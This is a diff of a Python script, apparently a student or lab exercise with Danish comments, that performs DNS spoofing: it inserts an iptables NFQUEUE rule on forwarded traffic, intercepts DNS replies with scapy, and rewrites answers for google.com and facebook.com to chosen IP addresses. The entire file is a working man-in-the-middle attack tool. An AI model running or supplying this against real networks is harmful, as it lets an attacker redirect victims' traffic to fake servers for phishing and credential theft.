@@ -1,52 +1,74 @@
+#!/usr/bin/python3
+
 import os
 from scapy.all import *
 from netfilterqueue import NetfilterQueue 
 
-dns_hosts = {b"www.google.dk": "192.168.18.128:443/facebook.html", b"google.dk": "192.168.18.128", b"facebook.dk": "192.168.18.128"}
+dns_hosts = {
+    b"www.google.com.": "192.168.1.100",
+    b"google.com.": "192.168.18.128",
+    b"facebook.com.": "172.217.19.142"
+}
 
 def process_packet(packet):
-	scapy_pkt = IP(packet.get_payload()) #Konvertere pakken til scapy format
-	# Fejlfinding. Den rammer ikke
-	print (packet)
-	print (scapy_pkt())
-	print (scapy_pkt)
-	#Fejlfinding. Den rammer ikke.
-	if scapy_pkt.haslayer(DNSRR): #Hvis pakken har DNS resource record (DNS reply) laver vi om på den
-		print ("[+] Packet before modification: ", scapy_pkt.summary())
-		try:
-			scapy_pkt = modify_packet(scapy_pkt)
-		except Exception as e:
-			print (e)
-			pass
-		print ("[+] Packet after modification: ", scapy_pkt.summary())
-		packet.set_payload(bytes(scapy_pkt))
-	packet.accept()
-
+    """
+    Whenever a new packet is redirected to the netfilter queue,
+    this callback is called.
+    """
+    # Konverter netfilter queue pakke til scapy pakke
+    scapy_packet = IP(packet.get_payload())
+    if scapy_packet.haslayer(DNSRR):
+        # Hvis pakken er DNS Resource Record (DNS reply) skal den modificeres
+        print("[Before]:", scapy_packet.summary())
+        try:
+            scapy_packet = modify_packet(scapy_packet)
+        except IndexError:
+            # not UDP packet, this can be IPerror/UDPerror packets
+            pass
+        print("[After ]:\n", scapy_packet.summary())
+        # Konverter pakke til netfilter queue pakke igen før den bliver sendt afsted
+        packet.set_payload(bytes(scapy_packet))
+    packet.accept()
 
 def modify_packet(packet):
-	qname = packet[DNSQR].qname
-	print (qname)
-	if qname not in dns_hosts: #Hvis navnet ikke er i vores host liste gør vi ikke noget
-		print ("[-] No modification made: ", qname)
-		return packet
-	#Her kigger vi i vores dns_hosts og hvis mapper fx www.google.dk til ip adressen
-	print (packet[DNS])
-	packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
-	#Her sætte vi svar tilbage til 1 gang
-	packet[DNS].ancount = 1
-	#Vi sletter checksums da der bliver lavet om på ting og det ellers vil give fejl
-	del packet[IP].len
-	del packet[IP].chksum
-	del packet[UDP].len
-	del packet[UDP].chksum
-	return packet
+    """
+    Modifies the DNS Resource Record `packet` ( the answer part)
+    to map our globally defined `dns_hosts` dictionary.
+    For instance, whenever we see a google.com answer, this function replaces 
+    the real IP address (172.217.19.142) with fake IP address (192.168.1.100)
+    """
+    # få domænets qname
+    qname = packet[DNSQR].qname
+    if qname not in dns_hosts:
+        # hvis qname ikke er en del af dns host variable
+        # skal der ikke laves noget ved pakken
+        print("no modification:", qname)
+        return packet
+    # Overskriv pakken med ip adresserne fra vores liste "dns_hosts[qname]"
+    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
+    # answer count til 1
+    packet[DNS].ancount = 1
+    # delete checksums and length of packet, because we have modified the packet
+    # new calculations are required ( scapy will do automatically )
+    del packet[IP].len
+    del packet[IP].chksum
+    del packet[UDP].len
+    del packet[UDP].chksum
+    # return the modified packet
+    return packet
 
-queue_num = 0
-os.system(f"iptables -I FORWARD -j NFQUEUE --queue-num {queue_num}")
+QUEUE_NUM = 0
+# insert the iptables FORWARD rule
+os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
+# instantiate the netfilter queue
 queue = NetfilterQueue()
 
-try: 
-	queue.bind(queue_num, process_packet)
-	queue.run()
+try:
+    # bind the queue number to our callback `process_packet`
+    # and start it
+    queue.bind(QUEUE_NUM, process_packet)
+    queue.run()
 except KeyboardInterrupt:
-	os.system("iptables --flush")
+    #Clean iptables
+    print ("Cleaning IP tables")
+    os.system("iptables --flush")
